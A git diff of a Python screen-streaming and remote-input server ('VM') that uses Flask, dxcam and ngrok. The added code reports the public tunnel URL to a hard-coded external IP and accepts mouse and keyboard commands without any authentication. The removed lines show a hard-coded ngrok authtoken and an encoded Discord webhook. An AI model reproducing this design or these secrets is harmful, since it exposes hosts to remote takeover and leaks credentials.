@@ -1,96 +1,56 @@
 import ctypes
-from ctypes import *
+import math
+import struct
+import io
+import os
+import logging
+import time
+import threading 
 import atexit
-import threading, zlib, os, logging, time
-import sys, base64, traceback
-
-
-
-def run(cmd):
-    return os.popen(cmd).read().replace("\n", "")
-    
-def install_packages(package_list):
-    existing_packages = run("pip list")
-    for package in package_list:
-        if package not in existing_packages:
-            print(f"Installing {package}")
-            run(f"pip install {package}")
-
-os.system("cls")
-if len(sys.argv) == 1:
-    X = input("X: ")
-
-    if X == "":
-        X = 192
-        Y = 108
-        FPS = 60
-        SIZE = 7
-        USE_NGROK = True
-        print("default")
-    else:
-        X = int(X)
-        Y, FPS, SIZE, USE_NGROK  = int(input("Y: ")), int(input("FPS: ")), int(input("Size: ")) , input("Use ngrok?: ").lower() == "y"
-else:
-    X = 192
-    Y = 108
-    FPS = 30
-    SIZE = 7
-    USE_NGROK = True
-
-InitNGROK = False 
-while True: 
-    try:  
-        from flask import Flask, request
-        import fast_json
-        import keyboard  
-        import pyvirtualcam
-        import numpy as np
-        import requests
-        import cv2
-        import dxcam
-        break
-    except ImportError as e:
-        InitNGROK = True
-        install_packages(['flask', 'opencv-python', 'pyngrok', 'numpy', 'fast_json', 'keyboard', 'pyvirtualcam', 'requests', 'dxcam'])
-
-if InitNGROK:
-    with open("setup.py", "w") as file: 
-        file.write(r'''
-from pyngrok import ngrok
-ngrok.get_tunnels() 
-''')
-    run("python setup.py")
-    run("ngrok authtoken 2VyDoQxO5XZZINaDx5QTyHarFbj_4sjRMJh4cNYQWU827jY16")
 
 from pyngrok import ngrok
-
-
-
-wh = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE1NzQ2Mjk0NjYzMzQ5ODY3Ny94WC1ZajNucFBWeGNMc2hwNHVDdmwzalU5SjAxSjczSGNRTzBCLWxUMC14NDdXeFJTVzJHVE95ZDZrZ0p5amZOakJHTA=="  
-wh = base64.b64decode(wh)
-
-def send_to_discord(content):
-    data = {"content": content}
-    response = requests.post(wh, json=data)
-    return response.status_code
-
-def handle_exception(exc_type, exc_value, exc_traceback):
-    error_details = "".join(traceback.format_exception(exc_type, exc_value, exc_traceback))
-    send_to_discord(f"Error:\n```{error_details}```")
-
-sys.excepthook = handle_exception
-
-
+from packages import * # im aware this is not great practice.
 
 log = logging.getLogger('werkzeug')
 log.disabled = True
 
+WEBCAMX = 10 
+WEBCAMY = 10
 
-SERVER_URL = "https://image.glorytosouthsud.repl.co/"
+Frame = np.zeros((WEBCAMX, WEBCAMY, 3), dtype=np.uint8)
+
+camera = dxcam.create()
+camera.start(target_fps = FPS, video_mode=True)
+
+lib = ctypes.CDLL(os.path.join(os.getcwd(), "LivestreamProcessor.dll"))
+
+class ProcessFramesResult(ctypes.Structure):
+    _fields_ = [
+        ("data", ctypes.POINTER(ctypes.c_ubyte)),
+        ("size", ctypes.c_size_t),
+    ]
 
 
+lib.process_frames.argtypes = [ctypes.c_char_p, ctypes.c_size_t]
 
-os.system("cls")
+lib.process_frames.restype = ProcessFramesResult
+
+lib.free_result.argtypes = [ctypes.POINTER(ctypes.c_ubyte), ctypes.c_size_t]
+lib.free_result.restype = None
+
+lib.clear_compressor_cache.argtypes = []
+lib.clear_compressor_cache.restype = None
+
+def process_frames(frames, width):
+
+    serialized_frames = fast_json.dumps(frames).encode("utf-8")
+    result = lib.process_frames(serialized_frames, width)
+    data, size = result.data, result.size
+
+    output = ctypes.string_at(data, size)
+    lib.free_result(data, size)
+
+    return output
 
 def get_size_in_units(input_string, units=["B", "KB", "MB", "GB"]):
     size_in_bytes = len(input_string)
@@ -100,67 +60,36 @@ def get_size_in_units(input_string, units=["B", "KB", "MB", "GB"]):
         unit_index += 1
     return f"{size_in_bytes:.2f} {units[unit_index]}"
 
-
-camera = dxcam.create()
-camera.start(target_fps = FPS, video_mode=True)
-
-
-
 def CreateHTTPTunnel(Port):
     for tunnel in ngrok.get_tunnels():
         tunnel.kill()
-
     tunnel = ngrok.connect(Port)
-
     url = tunnel.public_url
-
     print(f"Created ngrok tunnel at {url}")
-
     return url
 
+def quantize(img):
+    div = 128
+    quantized = img // div * div + div // 2
+    return quantized
 
-class ProcessFramesResult(ctypes.Structure):
-    _fields_ = [
-        ("data", ctypes.POINTER(ctypes.c_ubyte)),
-        ("size", ctypes.c_size_t),
-    ]
+def pack_int(number, bytes):
+    packed = bytearray()
+    for _ in range(bytes):
+        byte = number % 256
+        packed.insert(0, byte)
+        number = (number - byte) // 256
 
-
-lib = ctypes.CDLL(f"{os.getcwd()}\LivestreamProcessor.dll")
-
-lib.process_frames.argtypes = [ctypes.c_char_p]
-lib.process_frames.restype = ProcessFramesResult
-
-lib.free_result.argtypes = [ctypes.POINTER(ctypes.c_ubyte), ctypes.c_size_t]
-lib.free_result.restype = None
-
-lib.clear_compressor_cache.argtypes = None
-lib.clear_compressor_cache.restype = None
-
-def process_frames(frames):
-
-    serialized_frames = fast_json.dumps(frames).encode("utf-8")
-
-    result = lib.process_frames(serialized_frames)
-
-    data_size = result.size
-
-    output = ctypes.string_at(result.data, data_size)
-
-    lib.free_result(result.data, data_size)
-
-    return output
-
-
-
+    return packed
 
 def TakeScreenshots(Data):
+    screenshots = [ ]
+
     Resolution = Data["Resolution"]
-    X = Resolution["X"]
-    Y = Resolution["Y"]
     FrameRecordAmount = Data["FrameRecordAmount"]
 
-    screenshots = [ ]
+    X = Resolution["X"]
+    Y = Resolution["Y"]
 
     for i in range(FrameRecordAmount):
         image = camera.get_latest_frame()  
@@ -169,19 +98,10 @@ def TakeScreenshots(Data):
             continue
 
         res = cv2.resize(image, dsize=(X, Y), interpolation=3).reshape(-1, 3)
-        #div = 64
-        #quantized = res // div * div + div // 2 
-        
-        screenshots.append(res.tolist())
-
-    #print(f"Raw: {get_size_in_units(str(screenshots))}")
+        screenshots.append(quantize(res).tolist())
 
     return screenshots
 
-WEBCAMX = 10 
-WEBCAMY = 10
-
-Frame = np.zeros((WEBCAMX, WEBCAMY, 3), dtype=np.uint8)
 def Webcam():
     global Frame
     with pyvirtualcam.Camera(width=WEBCAMX, height=WEBCAMY, fps=20) as cam:
@@ -207,11 +127,10 @@ def WebcamDaemon():
     WebcamThread.start()
     return WebcamThread
 
-
-def DecompressZlib(Data : bytes):
-    return zlib.decompress(Data).decode("utf-8")
-
 def GetFrames(Data):
+    resolution = Data["Resolution"]
+    bits = math.ceil(math.log2(resolution["X"] * resolution["Y"] + 1))
+    width = math.ceil(bits / 8)
 
     start1 = time.time()
 
@@ -221,55 +140,39 @@ def GetFrames(Data):
     
 
     start2 = time.time()
-    VideoData = process_frames(Frames)
+    VideoData = process_frames(Frames, width)
     ProcessedTime = time.time() - start2
 
     print("\033[92m {}\033[00m" .format(f"Captured {Data['FrameRecordAmount']} frames in {FrameRecordTime} seconds\nProcessed frames in {ProcessedTime}"))
 
     return VideoData
 
+def Click(Body):
+    X = Body["X"]
+    Y = Body["Y"]
+    Type = Body["MouseButton"]
+    pyautogui.moveTo(X, Y)
 
-mouse_event = ctypes.windll.user32.mouse_event
-class VM:
-    def __init__(self):
-        pass
-    def Click(self, Body):
-        X = Body["X"]
-        Y = Body["Y"]
-        Type = Body["MouseButton"]
-        
+    if Type == "Left":
+        pyautogui.click()
+    elif Type == "Right":
+        pyautogui.click(button='right')
 
-        if X == 0 or Y == 0:
-            return 
-            
-        ctypes.windll.user32.SetCursorPos(X, Y)
-        
-        if Type == "Left":
-            mouse_event(2, 0, 0, 0,0) # left down
-            mouse_event(4, 0, 0, 0,0) # left up
-        elif Type == "Right":
-            mouse_event(8, 0, 0, 0, 0)
-            mouse_event(16, 0, 0, 0, 0)
+def PressAndRelease(key):
+    keyboard.press(key)
+    time.sleep(1)
+    keyboard.release(key)
 
+def SetVirtualCamera(CameraVideoData):
+    global Frame
+    for CamFrame in CameraVideoData:
+        Frame = RebuildCamera(CamFrame)        
 
-    def PressAndRelease(self, key):
-        keyboard.press(key)
-        time.sleep(1)
-        keyboard.release(key)
-    
-    def SetVirtualCamera(self, CameraVideoData):
-        global Frame
-        for CamFrame in CameraVideoData:
-            Frame = RebuildCamera(CamFrame)        
-
-
-Machine = VM()
 app = Flask(__name__)
 
 @app.route('/PingVM', methods = ["GET"]) 
 def PingVM():
     return "OK!"
-
 
 @app.route('/VMRefresh', methods = ["POST"]) 
 def VMRefresh():
@@ -278,17 +181,15 @@ def VMRefresh():
 
 @app.route('/VMInput', methods = ["POST"]) # type: ignore
 def VMInput():
-    try:
-        RequestBody = request.get_json()
-        Type = RequestBody.get("Type")
-        Body = RequestBody.get("Body")
-        
-        ({
-            "Mouse" : Machine.Click,
-            "Keyboard" : Machine.PressAndRelease
-        })[Type](Body)
-    except Exception as e:
-        send_to_discord(str(e))
+    RequestBody = request.get_json()
+    Type = RequestBody.get("Type")
+    Body = RequestBody.get("Body")
+    
+    ({
+        "Mouse" : Click,
+        "Keyboard" : PressAndRelease
+    })[Type](Body)
+
     return "OK!"
 
 @app.route("/GetVideoData", methods = ["POST", "GET"])
@@ -297,8 +198,11 @@ def GetVideoData():
     global X, Y, FPS
     print("Got request")
 
-    VideoData = GetFrames({
-        "FrameRecordAmount" : 30,
+    FrameRecordAmount = 30 
+    header = struct.pack('<HHBBB', X, Y, FPS, FrameRecordAmount, SIZE)
+
+    VideoData = header + GetFrames({
+        "FrameRecordAmount" : FrameRecordAmount,
         "FPS" : FPS,
         "Resolution" : {
             "X" : X,
@@ -309,20 +213,25 @@ def GetVideoData():
     if request.method == "POST":
         RequestBody = request.get_json()
 
-        CameraVideoData = RequestBody["Camera"]
-        Machine.SetVirtualCamera(CameraVideoData)
+        CameraVideoData = RequestBody.get("Camera")
+        if CameraVideoData:
+            SetVirtualCamera(CameraVideoData)
 
-        print("/GetVideoData took", time.time()- start, "seconds")
-        return VideoData
+        print("/GetVideoData took", time.time()- start, "seconds")     
     
-
-    Data = DecompressZlib(VideoData)
-
-   # print(f"Zzlib: {get_size_in_units(VideoData)}\nCompression withou zzlib: {get_size_in_units(Data)}")
-    return Data
+    return Response(io.BytesIO(VideoData), mimetype='application/octet-stream')
 
 def GetIP():
     return requests.get("https://api.ipify.org/?format=json").json()["ip"]
+
+GetFrames({
+    "FrameRecordAmount" : 30,
+    "FPS" : FPS,
+    "Resolution" : {
+        "X" : X,
+        "Y" : Y
+    }
+})
 
 def stop_capturer():
     global camera
@@ -331,18 +240,14 @@ def stop_capturer():
     
 atexit.register(stop_capturer)
 
-
 if __name__ == "__main__":
     WebcamDaemon()
     PORT = 42171
-    ServerUrl = USE_NGROK and CreateHTTPTunnel(PORT) or f"http://{GetIP()}:42171"
-    StreamData = {
-        "X" : X,
-        "Y" : Y,
-        "FPS" : FPS,
-        "Size" : SIZE,
-        "Tunnel" : ServerUrl
-    }
-
-    requests.post(SERVER_URL + "update_setting", json=StreamData)
+    ServerUrl = USE_NGROK and CreateHTTPTunnel(PORT) or f"http://{GetIP()}:{PORT}"
+    requests.post("http://172.235.51.119:42070/post_tunnel", json={"url": ServerUrl})
+    
+    print(f"Server is on {ServerUrl}")
     app.run(host='0.0.0.0', port=PORT)
+    os.system("cls")
+
+
